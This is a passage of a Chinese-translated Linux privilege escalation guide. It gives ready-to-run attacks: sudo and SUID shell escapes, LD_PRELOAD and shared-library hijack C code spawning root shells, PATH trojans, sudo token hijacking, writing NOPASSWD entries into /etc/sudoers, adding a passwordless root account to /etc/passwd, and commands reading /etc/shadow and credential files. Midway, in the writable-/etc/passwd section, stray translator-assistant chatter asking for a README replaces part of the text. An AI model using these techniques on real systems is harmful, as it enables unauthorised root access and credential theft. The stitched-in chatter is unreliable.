lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受一个漏洞影响，该漏洞允许 **UID > INT_MAX** 的用户提升权限。更多信息: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### 用户组

检查你是否为可能授予你 root 权限的**某个用户组的成员**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

如果可能，检查剪贴板中是否有任何有趣的内容
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

如果你**知道环境中的任何密码**，请**尝试使用该密码登录每个用户**。

### Su Brute

如果你不介意产生大量噪音，并且目标主机上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试暴力破解用户。

## Writable PATH abuses

### $PATH

如果你发现可以**在 $PATH 的某个目录中写入**，你可能能够通过**在可写目录中创建 backdoor**（名称为某个将由其他用户（理想情况下为 root）执行的命令）来提升权限，前提是该命令**不会从位于你可写目录之前的目录加载**。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些命令可能设置了 suid 位。使用以下方法检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
有些 **意外的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过在 root 目录中添加一个 ssh key 或调用 `sh` 来获取 shell 是很容易的。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时**set an environment variable**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个示例，**基于 HTB machine Admirer**，**易受** **PYTHONPATH hijacking** 的影响，可在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV 通过 sudo env_keep 保留 → root shell

如果 sudoers 保留了 `BASH_ENV`（例如 `Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互启动行为，在调用允许的命令时以 root 身份运行任意代码。

- Why it works: 对于非交互式 shells，Bash 会评估 `$BASH_ENV` 并在运行目标脚本之前对该文件执行 source。许多 sudo 规则允许运行脚本或 shell 包装器。如果 sudo 保留了 `BASH_ENV`，你的文件会以 root 权限被 source。

- Requirements:
- 你可以运行的 sudo 规则（任何目标在非交互模式下调用 `/bin/bash`，或任何 bash 脚本）。
- `BASH_ENV` 在 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固:
- 删除 `BASH_ENV`（和 `ENV`）从 `env_keep` 中，优先使用 `env_reset`。
- 避免为 sudo 允许的命令使用 shell 包装器；改用精简的二进制文件。
- 考虑在使用被保留的环境变量时对 sudo 的 I/O 进行日志记录和告警。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH` 或者 `secure_path` 包含可被攻击者写入的条目（例如 `/home/<user>/bin`），在 sudo 允许的目标中任何使用相对路径的命令都可以被覆盖。

- 要求：存在一个 sudo 规则（通常为 `NOPASSWD`），它运行一个脚本/二进制，该脚本调用命令时未使用绝对路径（`free`, `df`, `ps` 等），并且 PATH 中存在一个可写的条目且该条目在搜索顺序中优先。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 执行绕过路径
**跳转**以读取其他文件或使用 **symlinks**。例如在 sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，就更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 未指定命令路径

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
此技术也适用于如果 **suid** 二进制文件 **执行另一个未指定路径的命令（始终使用** _**strings**_ **检查奇怪的 SUID 二进制文件的内容）**，也可以使用此技术。

[Payload examples to execute.](payloads-to-execute.md)

### 带命令路径的 SUID binary

如果 **suid** 二进制文件 **执行另一个指定了路径的命令**，那么，你可以尝试 **导出一个与该 suid 文件所调用命令同名的函数**。

例如，如果一个 suid 二进制文件调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid 二进制时，这个函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

环境变量 **LD_PRELOAD** 用于指定一个或多个共享库（.so files），由加载器在其他库之前加载，包括标准 C 库 (`libc.so`)。这个过程称为预加载库。

然而，为了保持系统安全并防止该功能被滥用，特别是对 **suid/sgid** 可执行文件，系统会强制执行以下条件：

- 当可执行文件的 real user ID (_ruid_) 与 effective user ID (_euid_) 不匹配时，加载器会忽略 **LD_PRELOAD**。
- 对于带有 **suid/sgid** 的可执行文件，只有位于标准路径且同样具有 suid/sgid 的库会被预加载。

Privilege escalation 可能发生在你能够使用 `sudo` 执行命令且 `sudo -l` 的输出包含语句 **env_keep+=LD_PRELOAD** 的情况下。该配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时仍然保留并被识别，从而可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令 **编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后， **escalate privileges** 运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制 **LD_LIBRARY_PATH** 环境变量，则可以滥用类似的 privesc，因为他控制着库将被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到带有 **SUID** 权限且看起来异常的二进制程序时，最好确认它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，表明存在被利用的可能性。

要利用这个漏洞，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
此代码在被编译并执行后，旨在通过操作文件权限并执行具有提升权限的 shell 来提升权限。

将上述 C 文件编译为共享对象 (.so) 文件，使用：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID 二进制文件应该会触发 exploit，从而可能导致系统被攻陷。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经发现一个 SUID 二进制文件会从一个我们有写权限的文件夹加载库，接下来在该文件夹中用所需名称创建该库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要包含一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个精心整理的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。 [**GTFOArgs**](https://gtfoargs.github.io/) 在只能在命令中 **注入参数** 的情况下提供相同的信息。

该项目收集了 Unix 二进制文件的合法功能，这些功能可能被滥用来跳出受限 shell、提升或维持提权、传输文件、生成 bind 和 reverse shells，以及辅助其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能找到利用任何 sudo 规则的方法。

### 重用 Sudo 令牌

在你拥有 **sudo access** 但不知道密码的情况下，你可以通过 **等待 sudo 命令执行然后劫持会话令牌** 来提升权限。

提升权限的要求：

- 你已经以用户 "_sampleuser_" 拥有一个 shell
- "_sampleuser_" 在过去 **15mins** 内 **使用过 `sudo`** 来执行某些操作（默认情况下这是 sudo 令牌的持续时间，允许我们在不输入密码的情况下使用 `sudo`）
- `cat /proc/sys/kernel/yama/ptrace_scope` 是 0
- `gdb` 可访问（你能够上传它）

（你可以暂时使用 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 启用 `ptrace_scope`，或通过修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来永久修改）

如果满足所有这些要求，**你可以使用：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) 来提升权限

- 第一个漏洞利用程序（`exploit.sh`）将在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。你可以使用它来 **激活你会话中的 sudo 令牌**（你不会自动获得 root shell，执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **第二个 exploit** (`exploit_v2.sh`) 将在 _/tmp_ 创建一个 sh shell，**归 root 所有并带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三个 exploit** (`exploit_v3.sh`) 将 **创建一个 sudoers file**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或其内部创建的任何文件拥有**写权限**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来**为某个用户和 PID 创建 sudo 令牌**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且你以该用户拥有 PID 1234 的 shell，则可以在不需要知道密码的情况下**获取 sudo 权限**，方法如下：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 以及 `/etc/sudoers.d` 内的文件用于配置谁可以使用 `sudo` 以及如何使用。  
这些文件 **默认情况下只能被用户 root 和组 root 读取**。\
**如果**你可以**读取**此文件，可能能够**获得一些有价值的信息**，并且如果你可以**写入**任意文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你能写入，你就可以滥用此权限。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 二进制的选项，例如 OpenBSD 上的 `doas`；请记得检查其配置文件 `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道某个**用户通常连接到机器并使用 `sudo`** 来提权，并且你已经在该用户上下文获得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，该文件会先以 root 身份执行你的代码，然后再执行该用户的命令。然后，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会执行你的 sudo 可执行文件。

注意，如果该用户使用不同的 shell（不是 bash），你需要修改其他文件以添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示了 **加载的配置文件来自哪里**。通常，该文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取来自 `/etc/ld.so.conf.d/*.conf` 的配置文件。这些配置文件 **指向其他文件夹**，系统会在这些文件夹中 **搜索库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统将会在 `/usr/local/lib` 中搜索库**。

如果由于某种原因 **某个用户对下列路径具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任何文件，或 `/etc/ld.so.conf.d/*.conf` 中的配置文件所指向的任何目录，他可能能够提权。\
在以下页面查看 **如何利用此错误配置**：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，它将会根据 `RPATH` 变量的指定在该位置被程序使用。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 为进程提供可用 root 特权的一个子集。这样实际上将 root **特权划分为更小且区别明显的单元**。每个单元都可以独立授予进程。通过这种方式，完整的特权集合被缩减，从而降低被利用的风险。\
阅读以下页面以**了解有关 capabilities 及如何滥用它们的更多信息**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**表示“execute”的位** 意味着受影响的用户可以 **"cd"** 进入该文件夹。\
**"read"** 位意味着用户可以 **列出** **文件**，而 **"write"** 位意味着用户可以 **删除** 和 **创建** 新 **文件**。

## ACLs

访问控制列表 (ACLs) 代表可自由裁量权限的第二层，能够 **覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝对不是所有者或组成员的特定用户的权限，增强了对文件或目录访问的控制。这种**细粒度确保更精确的访问管理**。更多细节可以在 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) 找到。

**给** 用户 "kali" 授予对某文件的读写权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACL 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中，你可能可以 **hijack** 不同用户（**root**）的某些 **shell** 会话。\
在 **最新版本** 中，你只能 **connect** 到属于 **你自己的用户** 的 screen 会话。然而，你仍可能在会话内部发现 **有趣的信息**。

### screen sessions hijacking

**列出 screen 会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是 **旧 tmux 版本** 的问题。我无法以非特权用户的身份劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月至 2008 年 5 月 13 日之间，在 Debian 系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH keys 可能受到此漏洞影响。这个漏洞在这些 OS 上创建新的 ssh key 时发生，原因是 **只有 32,768 种可能的变体**。这意味着可以计算出所有可能性，**有了 ssh public key 就可以搜索相应的 private key**。你可以在这里找到计算出的可能性: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 有用的配置项

- **PasswordAuthentication:** 指定是否允许 password authentication。默认值为 `no`。
- **PubkeyAuthentication:** 指定是否允许 public key authentication。默认值为 `yes`。
- **PermitEmptyPasswords**: 当 password authentication 被允许时，指定服务器是否允许登录到 password 为空字符串的账户。默认值为 `no`。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认值为 `no`。可能的值：

- `yes`: root 可以使用 password 和 private key 登录
- `without-password` or `prohibit-password`: root 只能使用 private key 登录
- `forced-commands-only`: root 只能使用 private key 登录，且必须在 authorized_keys 中指定 command 选项
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于 user authentication 的 public keys 的文件。它可以包含像 `%h` 这样的 token，%h 会被替换为 home 目录。**你可以指定绝对路径**（以 `/` 开头）或**从用户的 home 的相对路径**。For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将表明，如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 会将你密钥的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的条目进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys** (without passphrases!) 留在你的 server 上。因此，你可以通过 ssh **jump** 到一个 **host**，然后从那里 **jump to another** **host**，**using** 存放在你 **initial host** 的 **key**。

你需要在 `$HOME/.ssh.config` 中设置此选项，像这样：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每当用户跳转到不同的机器时，该主机将能够访问密钥（这是一个安全问题）。

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent forwarding（默认允许）。

如果你发现环境中配置了 Forward Agent，请阅读下列页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profile 文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是**在用户运行新 shell 时执行的脚本**。因此，如果你能**写入或修改其中任何一个，你就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何异常的 profile 脚本，你应该检查它是否包含 **敏感细节**。

### Passwd/Shadow 文件

取决于操作系统，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份。因此建议**找到所有相关文件**并**检查是否可读**，以查看文件中是否有 **hashes**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效文件）中找到 **password hashes**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下任一命令生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我无法直接访问你的仓库文件。请把 src/linux-hardening/privilege-escalation/README.md 的内容粘贴到这里，我会把其中的英文翻译为中文并保持原有的 markdown/HTML 标签不变。

另外，请确认下面几点，以便我按你想要的方式处理“然后添加用户 `hacker` 并添加生成的密码”这一步：

- 你是希望我在翻译后的 README 中：
  1) 插入一段示例命令来在 Linux 上创建用户 hacker 并设置（我生成的）密码？还是
  2) 直接在 README 中写明一个实际的、我现在生成的明文密码（不安全，但按需可做）？还是
  3) 仅提供创建用户的命令模板，不包含具体密码？

- 目标系统的发行版/工具偏好（例如 Debian/Ubuntu 使用 useradd/adduser，或是其他），以及你是否希望使用 passwd 命令、chpasswd、或是把密码以 hashed 形式写入 /etc/shadow 的说明。

如果都交给我处理，我可以：
- 生成一个强随机密码（例如 16 字符包含大小写/数字/符号），
- 在翻译后的 README 中加入一个代码块，展示创建用户并设置该密码的命令（例如：useradd -m hacker && echo "hacker:<password>" | chpasswd），
- 并把生成的密码明文写在 README（按你的确认）。

请回复：粘贴 README 内容，并指示上面三项中你选择哪一种，以及是否需要我现在生成密码和命令。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令并用 `hacker:hacker`

或者，你可以使用以下几行来添加一个没有密码的虚拟用户。\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以 **写入一些敏感文件**。例如，你能否写入某些 **服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行**tomcat**服务器，并且你可以**修改位于 /etc/systemd/ 的 Tomcat 服务配置文件，**那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
下一次启动 tomcat 时，你的 backdoor 将被执行。

### 检查文件夹

下面的文件夹可能包含备份或有价值的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (最后一个你可能无法读取，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned 文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite 数据库文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **位于 PATH 的 Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

查看 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **可能包含密码的若干文件**。\
你可以使用的**另一个有趣的工具**是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux & Mac。

### 日志

如果你能读取日志，可能会在其中发现**有趣/机密的信息**。日志越异常，可能越有价值（大概）。\
另外，一些**配置不当的**（或被植入后门？）**审计日志**可能允许你**将密码记录**到审计日志中，如这篇文章所述： https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了能够读取日志，组 [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
